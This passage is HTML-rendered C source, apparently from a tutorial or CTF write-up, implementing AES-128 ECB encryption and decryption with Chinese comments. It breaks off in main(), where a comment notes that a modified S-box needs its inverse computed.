class="line">        <span class="number">0x90</span>, <span class="number">0xD8</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x8C</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x0A</span>, <span class="number">0xF7</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xB8</span>, <span class="number">0xB3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line">        <span class="number">0xD0</span>, <span class="number">0x2C</span>, <span class="number">0x1E</span>, <span class="number">0x8F</span>, <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0x0F</span>, <span class="number">0x02</span>, <span class="number">0xC1</span>, <span class="number">0xAF</span>, <span class="number">0xBD</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0x6B</span>,</span><br><span class="line">        <span class="number">0x3A</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4F</span>, <span class="number">0x67</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>, <span class="number">0x97</span>, <span class="number">0xF2</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0xF0</span>, <span class="number">0xB4</span>, <span class="number">0xE6</span>, <span class="number">0x73</span>,</span><br><span class="line">        <span class="number">0x96</span>, <span class="number">0xAC</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xE7</span>, <span class="number">0xAD</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xE2</span>, <span class="number">0xF9</span>, <span class="number">0x37</span>, <span class="number">0xE8</span>, <span class="number">0x1C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>, <span class="number">0x6E</span>,</span><br><span class="line">        <span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0x1A</span>, <span class="number">0x71</span>, <span class="number">0x1D</span>, <span class="number">0x29</span>, <span class="number">0xC5</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0xB7</span>, <span class="number">0x62</span>, <span class="number">0x0E</span>, <span class="number">0xAA</span>, <span class="number">0x18</span>, <span class="number">0xBE</span>, <span class="number">0x1B</span>,</span><br><span class="line">        <span class="number">0xFC</span>, <span class="number">0x56</span>, <span class="number">0x3E</span>, <span class="number">0x4B</span>, <span class="number">0xC6</span>, <span class="number">0xD2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9A</span>, <span class="number">0xDB</span>, <span class="number">0xC0</span>, <span class="number">0xFE</span>, <span class="number">0x78</span>, <span class="number">0xCD</span>, <span class="number">0x5A</span>, <span class="number">0xF4</span>,</span><br><span class="line">        <span class="number">0x1F</span>, <span class="number">0xDD</span>, <span class="number">0xA8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x31</span>, <span class="number">0xB1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>,</span><br><span class="line">        <span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7F</span>, <span class="number">0xA9</span>, <span class="number">0x19</span>, <span class="number">0xB5</span>, <span class="number">0x4A</span>, <span class="number">0x0D</span>, <span class="number">0x2D</span>, <span class="number">0xE5</span>, <span class="number">0x7A</span>, <span class="number">0x9F</span>, <span class="number">0x93</span>, <span class="number">0xC9</span>, <span class="number">0x9C</span>, <span class="number">0xEF</span>,</span><br><span class="line">        <span class="number">0xA0</span>, <span class="number">0xE0</span>, <span class="number">0x3B</span>, <span class="number">0x4D</span>, <span class="number">0xAE</span>, <span class="number">0x2A</span>, <span class="number">0xF5</span>, <span class="number">0xB0</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xBB</span>, <span class="number">0x3C</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line">        <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x04</span>, <span class="number">0x7E</span>, <span class="number">0xBA</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0x26</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0C</span>, <span class="number">0x7D</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* copy in[16] to state[4][4] */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">loadStateArray</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint8_t</span> *in)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            state[j][i] = *in++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* copy state[4][4] to out[16] */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">storeStateArray</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>], <span class="type">uint8_t</span> *out)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            *out++ = state[j][i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//秘钥扩展</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">keyExpansion</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, AesKey *aesKey)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == key || <span class="literal">NULL</span> == aesKey)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;keyExpansion param is NULL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (keyLen != <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;keyExpansion keyLen = %d, Not support.\n&quot;</span>, keyLen);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> *w = aesKey-&gt;eK;  <span class="comment">//加密秘钥</span></span><br><span class="line">    <span class="type">uint32_t</span> *v = aesKey-&gt;dK;  <span class="comment">//解密秘钥</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* keyLen is 16 Bytes, generate uint32_t W[44]. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* W[0-3] */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        LOAD32H(w[i], key + <span class="number">4</span>*i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* W[4-43] */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        w[<span class="number">4</span>] = w[<span class="number">0</span>] ^ MIX(w[<span class="number">3</span>]) ^ rcon[i];</span><br><span class="line">        w[<span class="number">5</span>] = w[<span class="number">1</span>] ^ w[<span class="number">4</span>];</span><br><span class="line">        w[<span class="number">6</span>] = w[<span class="number">2</span>] ^ w[<span class="number">5</span>];</span><br><span class="line">        w[<span class="number">7</span>] = w[<span class="number">3</span>] ^ w[<span class="number">6</span>];</span><br><span class="line">        w += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    w = aesKey-&gt;eK+<span class="number">44</span> - <span class="number">4</span>;</span><br><span class="line">    <span class="comment">//解密秘钥矩阵为加密秘钥矩阵的倒序，方便使用，把ek的11个矩阵倒序排列分配给dk作为解密秘钥</span></span><br><span class="line">    <span class="comment">//即dk[0-3]=ek[41-44], dk[4-7]=ek[37-40]... dk[41-44]=ek[0-3]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">11</span>; ++j) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            v[i] = w[i];</span><br><span class="line">        &#125;</span><br><span class="line">        w -= <span class="number">4</span>;</span><br><span class="line">        v += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 轮秘钥加</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">addRoundKey</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint32_t</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> k[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* i: row, j: col */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            k[i][j] = (<span class="type">uint8_t</span>) BYTE(key[j], <span class="number">3</span> - i);  <span class="comment">/* 把 uint32 key[4] 先转换为矩阵 uint8 k[4][4] */</span></span><br><span class="line">            state[i][j] ^= k[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//字节替换</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">subBytes</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="comment">/* i: row, j: col */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            state[i][j] = S[state[i][j]]; <span class="comment">//直接使用原始字节作为S盒数据下标</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//逆字节替换</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">invSubBytes</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="comment">/* i: row, j: col */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            state[i][j] = inv_S[state[i][j]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//行移位</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">shiftRows</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> block[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* i: row */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">    <span class="comment">//便于行循环移位，先把一行4字节拼成uint_32结构，移位后再转成独立的4个字节uint8_t</span></span><br><span class="line">        LOAD32H(block[i], state[i]);</span><br><span class="line">        block[i] = ROF32(block[i], <span class="number">8</span>*i);</span><br><span class="line">        STORE32H(block[i], state[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//逆行移位</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">invShiftRows</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> block[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* i: row */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        LOAD32H(block[i], state[i]);</span><br><span class="line">        block[i] = ROR32(block[i], <span class="number">8</span>*i);</span><br><span class="line">        STORE32H(block[i], state[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Galois Field (256) Multiplication of two Bytes */</span></span><br><span class="line"><span class="comment">// 两字节的伽罗华域乘法运算</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">GMul</span><span class="params">(<span class="type">uint8_t</span> u, <span class="type">uint8_t</span> v)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> p = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (u &amp; <span class="number">0x01</span>) &#123;    <span class="comment">//</span></span><br><span class="line">            p ^= v;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> flag = (v &amp; <span class="number">0x80</span>);</span><br><span class="line">        v &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">            v ^= <span class="number">0x1B</span>; <span class="comment">/* x^8 + x^4 + x^3 + x + 1 */</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        u &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列混合</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mixColumns</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> tmp[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="type">uint8_t</span> M[<span class="number">4</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>&#125;,</span><br><span class="line">                       &#123;<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>&#125;,</span><br><span class="line">                       &#123;<span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>&#125;,</span><br><span class="line">                       &#123;<span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy state[4][4] to tmp[4][4] */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)&#123;</span><br><span class="line">            tmp[i][j] = state[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;  <span class="comment">//伽罗华域加法和乘法</span></span><br><span class="line">            state[i][j] = GMul(M[i][<span class="number">0</span>], tmp[<span class="number">0</span>][j]) ^ GMul(M[i][<span class="number">1</span>], tmp[<span class="number">1</span>][j])</span><br><span class="line">                        ^ GMul(M[i][<span class="number">2</span>], tmp[<span class="number">2</span>][j]) ^ GMul(M[i][<span class="number">3</span>], tmp[<span class="number">3</span>][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逆列混合</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">invMixColumns</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> tmp[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="type">uint8_t</span> M[<span class="number">4</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>&#125;,</span><br><span class="line">                       &#123;<span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>&#125;,</span><br><span class="line">                       &#123;<span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>&#125;,</span><br><span class="line">                       &#123;<span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>&#125;&#125;;  <span class="comment">//使用列混合矩阵的逆矩阵</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy state[4][4] to tmp[4][4] */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)&#123;</span><br><span class="line">            tmp[i][j] = state[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j) &#123;</span><br><span class="line">            state[i][j] = GMul(M[i][<span class="number">0</span>], tmp[<span class="number">0</span>][j]) ^ GMul(M[i][<span class="number">1</span>], tmp[<span class="number">1</span>][j])</span><br><span class="line">                          ^ GMul(M[i][<span class="number">2</span>], tmp[<span class="number">2</span>][j]) ^ GMul(M[i][<span class="number">3</span>], tmp[<span class="number">3</span>][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES-128加密接口，输入key应为16字节长度，输入长度应该是16字节整倍数，</span></span><br><span class="line"><span class="comment">// 这样输出长度与输入长度相同，函数调用外部为输出数据分配内存</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aesEncrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, <span class="type">const</span> <span class="type">uint8_t</span> *pt, <span class="type">uint8_t</span> *ct, <span class="type">uint32_t</span> len)</span> &#123;</span><br><span class="line"></span><br><span class="line">    AesKey aesKey;</span><br><span class="line">    <span class="type">uint8_t</span> *pos = ct;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> *rk = aesKey.eK;  <span class="comment">//解密秘钥指针</span></span><br><span class="line">    <span class="type">uint8_t</span> out[BLOCKSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> actualKey[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> state[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == key || <span class="literal">NULL</span> == pt || <span class="literal">NULL</span> == ct)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;param err.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (keyLen &gt; <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;keyLen must be 16.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len % BLOCKSIZE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;inLen is invalid.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(actualKey, key, keyLen);</span><br><span class="line">    keyExpansion(actualKey, <span class="number">16</span>, &amp;aesKey);  <span class="comment">// 秘钥扩展</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用ECB模式循环加密多个分组长度的数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += BLOCKSIZE) &#123;</span><br><span class="line">                <span class="comment">// 把16字节的明文转换为4x4状态矩阵来进行处理</span></span><br><span class="line">        loadStateArray(state, pt);</span><br><span class="line">        <span class="comment">// 轮秘钥加</span></span><br><span class="line">        addRoundKey(state, rk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; ++j) &#123;</span><br><span class="line">            rk += <span class="number">4</span>;</span><br><span class="line">            subBytes(state);   <span class="comment">// 字节替换</span></span><br><span class="line">            shiftRows(state);  <span class="comment">// 行移位</span></span><br><span class="line">            mixColumns(state); <span class="comment">// 列混合</span></span><br><span class="line">            addRoundKey(state, rk); <span class="comment">// 轮秘钥加</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        subBytes(state);    <span class="comment">// 字节替换</span></span><br><span class="line">        shiftRows(state);  <span class="comment">// 行移位</span></span><br><span class="line">        <span class="comment">// 此处不进行列混合</span></span><br><span class="line">        addRoundKey(state, rk+<span class="number">4</span>); <span class="comment">// 轮秘钥加</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 把4x4状态矩阵转换为uint8_t一维数组输出保存</span></span><br><span class="line">        storeStateArray(state, pos);</span><br><span class="line"></span><br><span class="line">        pos += BLOCKSIZE;  <span class="comment">// 加密数据内存指针移动到下一个分组</span></span><br><span class="line">        pt += BLOCKSIZE;   <span class="comment">// 明文数据指针移动到下一个分组</span></span><br><span class="line">        rk = aesKey.eK;    <span class="comment">// 恢复rk指针到秘钥初始位置</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES128解密， 参数要求同加密</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">aesDecrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, <span class="type">const</span> <span class="type">uint8_t</span> *ct, <span class="type">uint8_t</span> *pt, <span class="type">uint32_t</span> len)</span> &#123;</span><br><span class="line">    AesKey aesKey;</span><br><span class="line">    <span class="type">uint8_t</span> *pos = pt;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> *rk = aesKey.dK;  <span class="comment">//解密秘钥指针</span></span><br><span class="line">    <span class="type">uint8_t</span> out[BLOCKSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> actualKey[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> state[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == key || <span class="literal">NULL</span> == ct || <span class="literal">NULL</span> == pt)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;param err.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (keyLen &gt; <span class="number">16</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;keyLen must be 16.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len % BLOCKSIZE)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;inLen is invalid.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(actualKey, key, keyLen);</span><br><span class="line">    keyExpansion(actualKey, <span class="number">16</span>, &amp;aesKey);  <span class="comment">//秘钥扩展，同加密</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += BLOCKSIZE) &#123;</span><br><span class="line">        <span class="comment">// 把16字节的密文转换为4x4状态矩阵来进行处理</span></span><br><span class="line">        loadStateArray(state, ct);</span><br><span class="line">        <span class="comment">// 轮秘钥加，同加密</span></span><br><span class="line">        addRoundKey(state, rk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; ++j) &#123;</span><br><span class="line">            rk += <span class="number">4</span>;</span><br><span class="line">            invShiftRows(state);    <span class="comment">// 逆行移位</span></span><br><span class="line">            invSubBytes(state);     <span class="comment">// 逆字节替换，这两步顺序可以颠倒</span></span><br><span class="line">            addRoundKey(state, rk); <span class="comment">// 轮秘钥加，同加密</span></span><br><span class="line">            invMixColumns(state);   <span class="comment">// 逆列混合</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        invSubBytes(state);   <span class="comment">// 逆字节替换</span></span><br><span class="line">        invShiftRows(state);  <span class="comment">// 逆行移位</span></span><br><span class="line">        <span class="comment">// 此处没有逆列混合</span></span><br><span class="line">        addRoundKey(state, rk+<span class="number">4</span>);  <span class="comment">// 轮秘钥加，同加密</span></span><br><span class="line"></span><br><span class="line">        storeStateArray(state, pos);  <span class="comment">// 保存明文数据</span></span><br><span class="line">        pos += BLOCKSIZE;  <span class="comment">// 输出数据内存指针移位分组长度</span></span><br><span class="line">        ct += BLOCKSIZE;   <span class="comment">// 输入数据内存指针移位分组长度</span></span><br><span class="line">        rk = aesKey.dK;    <span class="comment">// 恢复rk指针到秘钥初始位置</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方便输出16进制数据</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">printHex</span><span class="params">(<span class="type">uint8_t</span> *ptr, <span class="type">int</span> len, <span class="type">char</span> *tag)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\ndata[%d]: &quot;</span>, tag, len);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%.2X &quot;</span>, *ptr++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//S盒有变化,需要求出逆S盒</span></span><br><span class="line">    <span class="comment">//unsigned char change_S[256] = &#123;&#125;;</span></span><br><span class="line">    <span 